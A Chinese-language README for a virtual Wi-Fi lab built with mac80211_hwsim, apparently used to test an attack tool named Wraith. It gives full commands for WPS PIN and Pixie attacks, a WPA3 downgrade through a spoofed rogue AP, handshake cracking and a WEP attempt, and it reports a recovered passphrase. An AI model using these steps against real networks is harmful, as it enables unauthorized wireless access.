# hwsim 虚拟无线实验台

用 `mac80211_hwsim` 在**纯软件**里造 AP 和客户端，验证 Wraith 的 live 攻击链路。
不触碰任何真实 AP；本目录的配置是 2026-10-21 实测通过的那一套。

实测结果与踩坑记录见 [`docs/smoke-test-2026-10-21.md`](../../docs/smoke-test-2026-10-21.md) 第九节。

## 拓扑

| 接口 | 角色 | 默认 BSSID / 说明 |
|---|---|---|
| `wlan1` | 伪 AP / WPS AP / WEP AP | 配置里写死 `bssid=`，避免 hostapd 每次随机 |
| `wlan2` | 客户端（WPS/WPA3） | WPA3 受害者客户端也在这 |
| `wlan3` | 受害者 AP（WPA3 过渡） | `wpa3-victim.conf` |
| `wlan4` | 监听口 | **必须是主接口 + active monitor** |

## 准备

```bash
sudo modprobe mac80211_hwsim radios=4
sudo ip link set wlan1 up
sudo ip link set wlan2 up
sudo ip link set wlan3 up

# 监听口：先 down，再改 type，再开 active，最后 up
sudo ip link set wlan4 down
sudo iw dev wlan4 set type monitor
sudo iw dev wlan4 set monitor active
sudo ip link set wlan4 up
sudo iw dev wlan4 set channel 1
```

> `active` 是必须的：不加它，注入的 auth/assoc 不会被 ACK，hostapd 会回
> `Class 3 frame received from nonassociated STA`，reaver 卡在 `EAPOL START`。
> 也不能用 `iw dev wlanX interface add monX type monitor` 的二级 vif，同样没有 ACK。

## WPS（PIN / Pixie）

```bash
sudo hostapd -B -P /tmp/hostapd-wps.pid scripts/lab-hwsim/wps.conf
sleep 2

# PIN（本配置 ap_pin=12345670，应成功）
sudo -E .venv/bin/python -m wraith --iface wlan4 --live --authorized \
  attack wps_pin -b 02:11:22:33:44:55 -e WraithLab-WPS -c 1 \
  --security WPA2 --wps -o pin=12345670 -o timeout=120

# Pixie（hostapd 用强随机数，预期失败，但 M1/M2 → pixiewps 链路会完整跑）
sudo -E .venv/bin/python -m wraith --iface wlan4 --live --authorized \
  attack wps_pixie -b 02:11:22:33:44:55 -e WraithLab-WPS -c 1 \
  --security WPA2 --wps -o timeout=120
```

实测：PIN 2 秒得到 `PIN=12345670`、`PSK=WraithLab2024`；Pixie 返回
`WPS pin not found`（符合预期）。

## WPA3 过渡模式降级

```bash
sudo hostapd -B -P /tmp/hostapd-wpa3.pid scripts/lab-hwsim/wpa3-victim.conf
sleep 2
sudo wpa_supplicant -B -i wlan2 -c scripts/lab-hwsim/client-wpa3.conf \
  -P /tmp/wpa-wlan2.pid -f /tmp/wpa-wlan2.log
sleep 5
sudo iw dev wlan2 link        # 应连到 02:11:22:33:44:77

sudo ip link set wlan4 down; sudo iw dev wlan4 set type monitor
sudo iw dev wlan4 set monitor active; sudo ip link set wlan4 up
sudo iw dev wlan4 set channel 1

# 后台起攻击，14s 后停掉受害者 AP，逼客户端回落到伪 AP
sudo -E .venv/bin/python -m wraith --iface wlan1 --live --authorized \
  attack wpa3_downgrade -b 02:11:22:33:44:77 -e WraithLab-WPA3 -c 1 \
  --security WPA2/WPA3 -o timeout=90 -o spoof_bssid=true &
sleep 14
sudo kill "$(cat /tmp/hostapd-wpa3.pid)"
wait
```

实测：生成 `downgrade-021122334477-*.22000`（2 条），`aircrack-ng -w` 用
`WraithLab2024` 验证 `KEY FOUND!`。

- 必须 `spoof_bssid=true`：airodump 按目标 BSSID 过滤，伪 AP 换 BSSID 就抓不到。
- “停掉受害者 AP”是实验台专用手段；真实环境依赖 Deauth 把客户端踢向伪 AP。

## WEP（实验台不完整）

```bash
sudo hostapd -B -P /tmp/hostapd-wep.pid scripts/lab-hwsim/wep.conf
sudo ip addr add 10.10.10.1/24 dev wlan1
sudo ip link set wlan2 up
sudo iw dev wlan2 connect WraithLab-WEP 02:11:22:33:44:66 key 2:abcde d:2:abcde
```

该配置能让客户端关联，客户端发出的 WEP 加密帧也能用 `airdecap-ng -w abcde`
正确解出 ARP；但 hwsim 上 AP 不回 ARP（同主机路由 + hostapd WEP 数据路径问题），
airodump 拿不到 IV，WEP 模块会跑满超时。**WEP 请用真实老路由器验证**，或把客户端
放进独立 netns/另一台主机。

## 清理

```bash
sudo pkill -f 'hostapd .*lab-hwsim'
sudo pkill -f 'wpa_supplicant .*lab-hwsim'
sudo ip link set wlan1 down; sudo ip link set wlan2 down
sudo ip link set wlan3 down; sudo ip link set wlan4 down
sudo modprobe -r mac80211_hwsim
```

注意：`pkill -f` 的模式别写成会匹配到当前 shell 命令行的形式，否则会把自己杀掉。
